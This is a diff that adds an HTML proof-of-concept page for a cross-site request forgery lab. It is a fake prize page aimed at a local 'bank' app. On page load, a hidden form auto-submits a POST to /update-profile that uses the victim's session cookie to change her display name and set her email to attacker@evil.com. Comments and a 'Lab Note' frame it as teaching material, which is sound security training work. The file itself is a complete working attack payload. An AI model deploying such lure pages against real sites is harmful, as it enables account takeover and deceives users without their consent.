@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>You Won a Prize! 🎁</title>
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      font-family: "Segoe UI", Tahoma, sans-serif;
+      background: linear-gradient(130deg, #f2f4f8, #dbe4f3);
+      color: #1f2937;
+    }
+    .card {
+      width: min(620px, 92%);
+      background: #ffffff;
+      border: 1px solid #d1d5db;
+      border-radius: 14px;
+      padding: 28px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+    h1 { margin: 0 0 8px; font-size: 1.6rem; }
+    p  { margin: 0 0 10px; line-height: 1.5; color: #374151; }
+    .emoji { font-size: 3rem; margin-bottom: .5rem; }
+
+    /* Hidden attack — victim never sees this */
+    .hidden-attack { display: none; }
+
+    .note {
+      margin-top: 20px;
+      padding: 10px 14px;
+      border-left: 4px solid #dc2626;
+      background: #fef2f2;
+      font-size: 0.82rem;
+      color: #991b1b;
+      text-align: left;
+    }
+    .note strong { display: block; margin-bottom: 4px; }
+    .status {
+      margin-top: 14px;
+      padding: 10px 14px;
+      border-left: 4px solid #0f766e;
+      background: #ecfeff;
+      font-weight: 600;
+      font-size: 0.92rem;
+      text-align: left;
+    }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="emoji">🎁</div>
+    <h1>Congratulations! You Won!</h1>
+    <p>Click below to claim your free prize. Your details are being verified…</p>
+    <p style="color:#6b7280; font-size:.85rem">
+      (What the victim sees — looks completely harmless)
+    </p>
+
+    <!--
+      ══════════════════════════════════════════════
+      CSRF PAYLOAD — invisible to the victim
+      Targets the vulnerable /update-profile endpoint
+      Browser auto-attaches Alice's session cookie
+      ══════════════════════════════════════════════
+    -->
+    <form
+      id="csrf-form"
+      class="hidden-attack"
+      action="http://127.0.0.1:5000/update-profile"
+      method="POST"
+    >
+      <input type="hidden" name="display_name" value="Hacked by CSRF 💀" />
+      <input type="hidden" name="email"        value="attacker@evil.com" />
+    </form>
+
+    <div class="status" id="status-msg">
+      ⏳ Page loaded — submitting forged request to bank…
+    </div>
+
+    <div class="note">
+      <strong>🔬 Lab Note (visible only in PoC)</strong>
+      This page auto-submitted a hidden POST form to
+      <code>http://127.0.0.1:5000/update-profile</code>
+      using Alice's active session cookie — without her knowledge or consent.
+      Go back to the bank tab and refresh to see the profile changed.
+    </div>
+  </main>
+
+  <script>
+    window.addEventListener("load", function () {
+      document.getElementById("csrf-form").submit();
+      document.getElementById("status-msg").textContent =
+        "✅ Forged request sent! Refresh the bank tab — profile is now changed.";
+    });
+  </script>
+</body>
+</html>
